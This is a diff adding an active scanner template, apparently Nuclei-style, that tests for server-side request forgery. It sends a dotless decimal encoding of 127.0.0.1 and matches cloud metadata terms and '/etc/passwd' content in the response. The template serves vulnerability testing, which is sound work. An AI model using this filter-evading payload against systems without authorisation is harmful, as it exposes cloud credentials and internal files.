@@ -1,0 +1,23 @@
+id: patt-ssrf-deci-01-fetch
+name: 'PATT ssrf patt-ssrf-deci-01 via fetch'
+severity: high
+type: active
+tags:
+  - ssrf
+  - patt
+  - encodedecimal
+description: 'PATT dotless decimal 127.0.0.1. [patt:patt-ssrf-deci-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      fetch:
+        - 'http://2130706433/'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ami-id'
+          - 'instance-id'
+          - 'metadata'
+          - 'root:x:0:0'
